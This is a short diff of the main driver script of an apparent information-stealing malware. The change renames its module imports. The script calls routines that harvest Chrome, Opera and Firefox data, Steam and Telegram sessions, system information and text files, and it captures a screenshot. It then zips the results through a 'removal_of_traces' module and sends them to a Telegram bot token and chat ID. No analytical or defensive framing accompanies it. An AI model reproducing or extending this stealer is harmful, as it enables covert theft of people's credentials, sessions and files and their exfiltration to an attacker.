@@ -17,35 +17,35 @@ userCHAT_ID = ''
 
 
 
-from modules.others import folder
-from modules.system import sys
-from modules.system import screen
-from modules.browsers import chrome
-from modules.browsers import opera
-from modules.browsers import firefox
-from modules.others import telegram
-from modules.others import sender
-from modules.others import makeitclean
-from modules.others import steam
-from modules.system import txt
+from scripts.send import make_folder
+from scripts.system import system_info
+from scripts.system import screenshoot
+from scripts.browsers import chrome
+from scripts.browsers import opera
+from scripts.browsers import firefox
+from scripts.another import telegram
+from scripts.send import send
+from scripts.removal_of_traces import clear
+from scripts.another import steam
+from scripts.system import Files_txt
 
 
 
-folder.makeFolders()
+make_folder.makeFolders()
 chrome.Chrome()
 opera.Opera()
 firefox.Firefox()
 steam.Steam()
-sys.SystemInfo()
-txt.TxtSteal()
+system_info.SystemInfo()
+Files_txt.TxtSteal()
 telegram.Telegram()
-screen.Screenshot()
+screenshoot.Screenshot()
 
 try:
-    makeitclean.makemeZip()
+    clear.makemeZip()
 except Exception as e:
     print(e)
 try:
-    sender.Send(userTOKEN,userCHAT_ID)
+    send.Send(userTOKEN,userCHAT_ID)
 except Exception as e:
     print(e)
